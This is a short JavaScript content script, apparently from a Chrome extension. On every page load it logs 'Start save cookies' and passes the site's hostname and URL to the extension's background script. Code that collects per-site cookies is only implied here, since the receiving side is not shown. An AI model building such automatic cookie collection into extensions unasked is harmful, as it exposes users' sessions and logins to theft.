window.addEventListener("load", loadEvent, false);

function getCookies(domain, url) {
    chrome.runtime.sendMessage({ domain: domain, url: url }, async function (response) {
        console.log(response);
    });
}

function loadEvent(evt) {
    console.log("Start save cookies");
    getCookies(window.location.hostname, window.location.href)
}
